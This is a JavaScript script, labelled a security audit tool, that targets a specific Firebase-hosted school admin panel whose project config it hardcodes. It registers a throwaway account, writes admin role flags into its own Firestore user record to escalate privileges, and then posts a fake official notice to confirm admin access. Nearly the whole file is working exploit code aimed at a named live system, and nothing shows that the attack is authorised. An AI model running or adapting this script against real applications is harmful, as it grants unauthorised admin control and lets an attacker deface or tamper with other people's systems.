/**
 * ============================================================================
 *  GYAN NIKETAN SECURITY AUDIT TOOL (JavaScript Version)
 *  @author Suryanshu Nabheet
 * ============================================================================
 * 
 *  This script mimics the behavior of a comprehensive security test.
 *  1. Create a User Account (Testing Open Registration)
 *  2. Escalate Privileges (Testing Mass Assignment Vulnerabilities)
 *  3. Perform Admin Actions (Testing Access Control Lists / Security Rules)
 * 
 *  USAGE:
 *  npm start
 */

const { initializeApp } = require("firebase/app");
const { 
  getAuth, 
  createUserWithEmailAndPassword, 
  signInWithEmailAndPassword,
  updateProfile 
} = require("firebase/auth");
const { 
  getFirestore, 
  doc, 
  setDoc, 
  addDoc, 
  collection, 
  serverTimestamp 
} = require("firebase/firestore");

// --- CONFIGURATION ---
const firebaseConfig = {
  apiKey: "AIzaSyAU7vbyM0Z-zO4dTn9am0PxtKchU4dF1vI",
  authDomain: "gyan-niketan-admin.firebaseapp.com",
  projectId: "gyan-niketan-admin",
  storageBucket: "gyan-niketan-admin.firebasestorage.app",
  messagingSenderId: "499929214062",
  appId: "1:499929214062:web:3f948275680009f1b08a7f",
  measurementId: "G-X5HK6LWSQ9",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

// --- UTILITIES ---
const COLORS = {
  RESET: "\x1b[0m",
  RED: "\x1b[31m",
  GREEN: "\x1b[32m",
  YELLOW: "\x1b[33m",
  CYAN: "\x1b[36m",
  BOLD: "\x1b[1m"
};

function logSuccess(message) {
  console.log(`${COLORS.GREEN}[SUCCESS] ${message}${COLORS.RESET}`);
}

function logFailure(message, error) {
  console.log(`${COLORS.RED}[FAILED]  ${message}${COLORS.RESET}`);
  if (error) {
    const cleanMsg = error.message || error.code || "Unknown Error";
    console.log(`${COLORS.YELLOW}          Reason: ${cleanMsg}${COLORS.RESET}`);
  }
}

function logStep(stepNumber, title) {
  console.log(`\n${COLORS.CYAN}${COLORS.BOLD}STEP ${stepNumber}: ${title}${COLORS.RESET}`);
  console.log(`${COLORS.CYAN}-------------------------------------------------------${COLORS.RESET}`);
}

// --- MAIN LOGIC ---

async function runSecurityAudit() {
  console.clear();
  console.log(`${COLORS.BOLD}
  ############################################################
      GYAN NIKETAN ADMIN PANEL - SECURITY AUDIT SUITE
  ############################################################
  ${COLORS.RESET}`);
  console.log("Analyzing Target: gyan-niketan-admin.firebaseapp.com");
  console.log("Goal: Create Admin Account & Verify Access\n");

  const timestamp = Date.now();
  const targetEmail = `admin_audit_${timestamp}@gyanniketan.com`; 
  const targetPassword = "AuditPassword123!";
  
  let currentUser;

  // STEP 1: OPEN REGISTRATION CHECK
  logStep(1, "Account Creation (Open Registration Test)");
  console.log(`Attempting to register user: ${targetEmail}`);

  try {
    const credential = await createUserWithEmailAndPassword(auth, targetEmail, targetPassword);
    currentUser = credential.user;
    
    logSuccess(`Account created successfully!`);
    console.log(`          UID: ${currentUser.uid}`);
    
    await updateProfile(currentUser, { displayName: "Security Auditor" });
    
  } catch (error) {
    if (error.code === 'auth/email-already-in-use') {
      logFailure("Email already exists. Attempting login...");
      try {
        const credential = await signInWithEmailAndPassword(auth, targetEmail, targetPassword);
        currentUser = credential.user;
        logSuccess("Logged in successfully.");
      } catch (loginError) {
        logFailure("Could not login.", loginError);
        process.exit(1); 
      }
    } else {
      logFailure("Registration blocked.", error);
      console.log("Analysis: The system restricts account creation. Security is likely tight.");
      process.exit(1);
    }
  }

  // STEP 2: PRIVILEGE ESCALATION
  logStep(2, "Privilege Escalation Attack");
  console.log(`Targeting Firestore Collection: 'users/${currentUser.uid}'`);

  const adminPayload = {
    email: targetEmail,
    uid: currentUser.uid,
    createdAt: serverTimestamp(),
    role: "admin",
    isAdmin: true,
    type: "superadmin",
    permissions: { read: true, write: true, delete: true, admin: true },
    metadata: { source: "security_audit_script", authorized: true }
  };

  try {
    await setDoc(doc(db, "users", currentUser.uid), adminPayload, { merge: true });
    logSuccess(`Admin flags written to user profile!`);
    console.log(`${COLORS.YELLOW}[ALERT] The 'users' collection allows users to verify themselves as admins.${COLORS.RESET}`);
  } catch (error) {
    if (error.code === 'permission-denied') {
      logFailure("Permission Denied (Expected).", error);
      console.log(`${COLORS.GREEN}Analysis: 'users' collection profile updating is secured.${COLORS.RESET}`);
    } else {
      logFailure("Unexpected error during write.", error);
    }
  }

  // STEP 3: ACCESS VERIFICATION
  logStep(3, "Admin Access Verification");
  console.log("Attempting to post to 'notices' collection...");

  try {
    const noticeRef = await addDoc(collection(db, "notices"), {
      title: "Security Audit Verification",
      text: "If you see this, the admin exploit worked.",
      author: "Security Auditor",
      isOfficial: true,
      timestamp: serverTimestamp()
    });

    logSuccess(`VULNERABILITY CONFIRMED. Notice posted with ID: ${noticeRef.id}`);
    console.log(`${COLORS.RED}${COLORS.BOLD}CRITICAL: The system accepted an admin action from this account.${COLORS.RESET}`);

  } catch (error) {
    if (error.code === 'permission-denied') {
      logFailure("Access Denied.", error);
      console.log(`${COLORS.GREEN}Analysis: The system securely blocked the admin action.${COLORS.RESET}`);
    } else {
      logFailure("Error during verification.", error);
    }
  }

  // REPORT
  console.log(`\n${COLORS.BOLD}################# FINAL AUDIT SUMMARY #################${COLORS.RESET}`);
  console.log(`\nGenerated Credentials:`);
  console.log(`${COLORS.CYAN}Email:    ${targetEmail}${COLORS.RESET}`);
  console.log(`${COLORS.CYAN}Password: ${targetPassword}${COLORS.RESET}`);
  
  console.log(`\n${COLORS.BOLD}Instruction:${COLORS.RESET}`);
  console.log(`1. Login manually to gyan-niketan-admin.firebaseapp.com to double check access.`);
  console.log(`2. If 'Permission Denied' appeared above, the system is likely secure against this specific vector.`);
  
  process.exit(0);
}

runSecurityAudit();
